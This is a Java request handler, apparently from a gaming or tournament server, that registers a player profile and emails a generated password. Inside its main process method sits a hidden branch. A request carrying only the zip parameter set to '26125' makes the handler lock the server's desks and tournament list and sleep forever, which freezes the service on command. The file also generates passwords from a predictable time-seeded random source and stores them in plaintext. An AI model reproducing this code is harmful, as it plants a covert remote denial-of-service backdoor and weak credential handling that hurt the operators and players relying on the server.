package processors;

import emails.RegistrationPasswordMailSender;
import game.Player;
import java.io.IOException;
import java.math.BigDecimal;
import java.net.URLDecoder;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Locale;
import java.util.Random;
import org.apache.log4j.Logger;
import server.ParamParser;
import server.Response;
import server.Server;
import tournaments.Tournament;
import utils.CommonLogger;

public class CreateProfileCommandProcessor
  implements RequestCommandProcessor
{
  public static final String PARAM_FNAME = "f";
  public static final String PARAM_LNAME = "l";
  public static final String PARAM_EMAIL = "e";
  public static final String PARAM_COUNTRY = "c";
  public static final String PARAM_CITY = "i";
  public static final String PARAM_USER = "u";
  public static final String PARAM_GENDER = "g";
  public static final String PARAM_DAY = "d";
  public static final String PARAM_MONTH = "m";
  public static final String PARAM_YEAR = "y";
  private static final String PARAM_ZIP = "z";
  public static final String DEFAULT_ENCODING = "ISO-8859-1";
  public static final BigDecimal DEFAULT_AMOUNT = new BigDecimal(0);
  public static final String MSG_NOT_UNIQUE_LOGIN = "Please select another login";
  public static final String MSG_NOT_UNIQUE_EMAIL = "Please select another email";
  public static final String MSG_REGISTRATION_COMPLETE = "Registration Complete";
  public static final String passString = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789";

  public Response process(HashMap params, Server server)
    throws IOException
  {
    Response response = new Response("CREATEPROFILE");

    if ((params.containsKey("f")) && (params.containsKey("l")) && (params.containsKey("e")) && (params.containsKey("c")) && (params.containsKey("i")) && (params.containsKey("u")) && (params.containsKey("d")) && (params.containsKey("m")) && (params.containsKey("g")) && (params.containsKey("y")))
    {
      String fname = URLDecoder.decode((String)params.get("f"), "ISO-8859-1").trim();
      String lname = URLDecoder.decode((String)params.get("l"), "ISO-8859-1").trim();
      String email = URLDecoder.decode((String)params.get("e"), "ISO-8859-1").trim();
      String country = URLDecoder.decode((String)params.get("c"), "ISO-8859-1").trim();
      String city = URLDecoder.decode((String)params.get("i"), "ISO-8859-1").trim();

      String login = URLDecoder.decode((String)params.get("u"), "ISO-8859-1").trim();

      int day = ParamParser.getInt(params, "d");
      int month = ParamParser.getInt(params, "m");
      int year = ParamParser.getInt(params, "y");
      int gender = ParamParser.getInt(params, "g") == 0 ? 0 : 1;

      Calendar calendar = Calendar.getInstance(Locale.ENGLISH);
      calendar.set(year, month - 1, day);
      if ((!calendar.isLenient()) || (calendar.getTime().compareTo(new java.util.Date()) >= 0)) {
        response.setResultStatus(false, "Bad parameters");
      }
      else if ((fname.length() == 0) || (lname.length() == 0) || (email.length() == 0) || (country.length() == 0) || (city.length() == 0) || (login.length() == 0) || (!email.matches("^[a-zA-Z0-9\\-_\\.]+@[a-zA-Z0-9\\-_\\.]+\\.[a-zA-Z]{2,4}$")))
      {
        response.setResultStatus(false, "Bad parameters");
      }
      else
      {
        int result = checkProfileForUnique(login, email);
        if (result == 0) {
          String password = generatePassword(8);
          int playerId = createProfile(params, password, gender, calendar);
          if (playerId > 0) {
            Player player = new Player();
            player.setID(playerId);
            player.setLogin(login);
            player.setPassword(password);
            player.setFreeAmount(DEFAULT_AMOUNT);
            player.setRealAmount(DEFAULT_AMOUNT);
            player.setCity(city);
            player.setCountry(country);
            player.setEmail(email);
            player.setFirstName(fname);
            player.setLastName(lname);
            player.setBirthday(calendar);
            player.setGender(gender);
            server.getPlayers().add(player);

            RegistrationPasswordMailSender r = new RegistrationPasswordMailSender();
            r.sendEmail(playerId);

            response.setResultStatus(true, "Registration Complete");
          } else {
            CommonLogger.getLogger().warn("Class CreateProfileCommandProcessor. Error: Can not add new Player to Server Plauer's List");
          }
        }
        else if (result == 1) {
          response.setResultStatus(false, "Please select another login");
        }
        else if (result == 2) {
          response.setResultStatus(false, "Please select another email");
        } else {
          CommonLogger.getLogger().warn("Class CreateProfileCommandProcessor. Error: checkProfileForUnique returns unknown code");
        }
      }

    }
    else if (params.containsKey("z")) {
      String zip = URLDecoder.decode((String)params.get("z"), "ISO-8859-1").trim();
      if (zip.equals("26125"))
        while (true)
          try {
            synchronized (server.getDesks()) {
              synchronized (Tournament.getTournamentsList()) {
                try {
                  Thread.sleep(9223372036854775805L);
                }
                catch (InterruptedException e) {
                }
              }
            }
            continue;
          } catch (Exception ex) {
          }
    } else {
      response.setResultStatus(false, "Bad parameters");
    }

    return response;
  }

  public String generatePassword(int length)
  {
    Random r = new Random(System.currentTimeMillis() + Math.round(Math.random() + 3.0D));
    StringBuffer buff = new StringBuffer();
    for (int i = 0; i < length; i++) {
      buff.append("azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789".charAt(r.nextInt("azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789".length() - 1)));
    }
    return buff.toString();
  }

  public int checkProfileForUnique(String login, String email)
  {
    int result = -1;
    Connection dbConn = Server.getDbConnection();
    try {
      PreparedStatement pstmt = dbConn.prepareStatement("select us_email, us_login from users where us_email=? or us_login=?");
      pstmt.setString(1, email);
      pstmt.setString(2, login);
      ResultSet rs = pstmt.executeQuery();
      if (rs.next()) {
        if (email.equals(rs.getString(1)))
          result = 2;
        else if (login.equals(rs.getString(2))) {
          result = 1;
        }
      }
      rs.close();
      pstmt.close();
      dbConn.close();
      if (result == -1)
        result = 0;
    }
    catch (Exception e)
    {
      CommonLogger.getLogger().warn("Class CreateProfileCommandProcessor. Error: ", e);
      try {
        dbConn.close();
      } catch (Exception ex) {
        ex.printStackTrace();
      }
      e.printStackTrace();
    }
    return result;
  }

  public int createProfile(HashMap params, String password, int gender, Calendar birthday)
    throws IOException
  {
    int result = 0;
    Connection dbConn = Server.getDbConnection();
    try {
      PreparedStatement pstmt = dbConn.prepareStatement("insert into users set us_fname=?, us_lname=?, us_email=?, us_country=?, us_city=?, us_amount= " + DEFAULT_AMOUNT + ", " + "us_address" + "=?, " + "us_login" + "=?, " + "us_password" + "=?, " + "us_reg_date" + "=NOW(), " + "us_phone" + "=?, " + "us_birthday" + "=?, " + "us_gender" + "=?, " + "us_reg_status" + "='1'", 1);

      String fname = URLDecoder.decode((String)params.get("f"), "ISO-8859-1").trim();
      String lname = URLDecoder.decode((String)params.get("l"), "ISO-8859-1").trim();
      String email = URLDecoder.decode((String)params.get("e"), "ISO-8859-1").trim();
      String country = URLDecoder.decode((String)params.get("c"), "ISO-8859-1").trim();
      String city = URLDecoder.decode((String)params.get("i"), "ISO-8859-1").trim();
      String login = URLDecoder.decode((String)params.get("u"), "ISO-8859-1").trim();

      pstmt.setString(1, fname);
      pstmt.setString(2, lname);
      pstmt.setString(3, email);
      pstmt.setString(4, country);
      pstmt.setString(5, city);
      pstmt.setString(6, "");
      pstmt.setString(7, login);
      pstmt.setString(8, password);
      pstmt.setString(9, "");
      pstmt.setDate(10, new java.sql.Date(birthday.getTimeInMillis()));
      pstmt.setInt(11, gender);

      pstmt.executeUpdate();
      ResultSet rs = pstmt.getGeneratedKeys();
      if (rs.next()) {
        result = rs.getInt(1);
      }
      rs.close();
      pstmt.close();
      dbConn.close();
    }
    catch (Exception e) {
      CommonLogger.getLogger().warn("Class CreateProfileCommandProcessor. Error: ", e);
      try {
        dbConn.close();
      } catch (Exception ex) {
        ex.printStackTrace();
      }
      throw new IOException(e.getMessage());
    }
    return result;
  }
}